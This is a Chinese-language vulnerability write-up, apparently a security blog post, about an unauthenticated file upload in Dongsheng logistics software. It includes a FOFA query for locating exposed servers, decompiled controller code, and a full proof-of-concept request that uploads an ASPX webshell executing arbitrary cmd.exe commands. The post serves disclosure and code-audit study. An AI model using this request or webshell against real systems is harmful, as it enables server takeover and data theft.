---
title: "东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞"
source: https://mrxn.net/jswz/dongsheng-SoftMng-FileInputHandler-Upload-RCE.html
asset_dir: assets/东胜物流软件-softmngfileinputhandlerupload-文件上传漏洞
---

# 东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/6 08:31
- 375浏览
- [0评论](#comment)
- 36分钟阅读

深入探索

服务器

Server

身份验证

---

# 漏洞简介

东胜物流系统是一款用于物流管理的系统。该系统的 /SoftMng/FileInputHandler/Upload 接口存在未授权的[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。攻击者可以通过该接口上传恶意文件（如webshell），从而获取服务器权限，导致系统安全受到严重威胁。

物流软件安全

# 影响版本

# fofa语法

> (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜”

# 漏洞分析

根据.NET MVC框架特点找到DSWeb.SoftMng中对于路由的定义

```
using System.Web.Mvc;

#nullable disable
namespace DSWeb.SoftMng;

public class MvcShippingRegistration : AreaRegistration
{
  public override string AreaName => "SoftMng";

  public override void RegisterArea(AreaRegistrationContext context)
  {
    context.MapRoute("SoftMng_default", "SoftMng/{controller}/{action}/{id}", (object) new
    {
      action = "Index",
      id = UrlParameter.Optional
    });
  }
}
```

深入探索

技术文章订阅

Docker加速服务

安全研究工具

在DSWeb.SoftMng.Controllers下找到**FileInputHandlerController**里的**Upload()**方法

```
public JsonResult Upload()
{
  try
  {
    ArrayList arrayList = new ArrayList();
    for (int index = 0; index < ((NameObjectCollectionBase) this.Request.Files).Count; ++index)
    {
      HttpPostedFileBase file = this.Request.Files[index];
      if (file != null && file.ContentLength > 0)
      {
        DateTime now = DateTime.Now;
        string str1 = "../../UploadFiles/Filepuload/" + now.ToString("yyyyMM");
        string str2 = this.Server.MapPath(str1);
        if (!Directory.Exists(str2))
          Directory.CreateDirectory(str2);
        string extension = Path.GetExtension(file.FileName);
        object[] objArray = new object[5]
        {
          (object) "\\",
          null,
          null,
          null,
          null
        };
        now = DateTime.Now;
        objArray[1] = (object) now.ToString("yyyyMMddHHmmssfff");
        objArray[2] = (object) "_";
        objArray[3] = (object) new Random().Next(100, 999);
        objArray[4] = (object) extension;
        string str3 = string.Concat(objArray);
        string str4 = str2 + str3;
        if (System.IO.File.Exists(str4))
          System.IO.File.Delete(str4);
        file.SaveAs(str4);
        arrayList.Add((object) (str1 + str3));
      }
    }
    return this.Json((object) new
    {
      success = true,
      data = arrayList
    });
  }
  catch (Exception ex)
  {
    return this.Json((object) new
    {
      success = false,
      msg = ex.Message
    });
  }
}
```

注意其中关键部分

漏洞预警服务

```
string extension = Path.GetExtension(file.FileName);
// ... 直接使用 extension 拼接文件名
file.SaveAs(str4);
```

1. **缺少文件扩展名验证**：代码直接使用 `Path.GetExtension(file.FileName)` 获取扩展名，未进行任何黑/白名单校验
2. **回显的上传路径**：上传路径为 `../../UploadFiles/Filepuload/yyyyMM/`，且会通过json返回文件路径`arrayList.Add((object) (str1 + str3));`
3. **Web 可访问目录**：文件保存在 `UploadFiles` 下，该目录通常可被 Web 服务器直接访问

# 漏洞复现

```
POST /SoftMng/FileInputHandler/Upload HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
}
</script>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

响应回显文件路径即可[执行命令](https://mrxn.net/tag/rce)

网络安全

[![东胜物流软件 /SoftMng/FileInputHandler/Upload 文件上传漏洞](images/img-001-da4c4f9f908c.webp)](https://image.mrxn.net/a96511bfcdd2445ab1c36ec4d79d9787.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
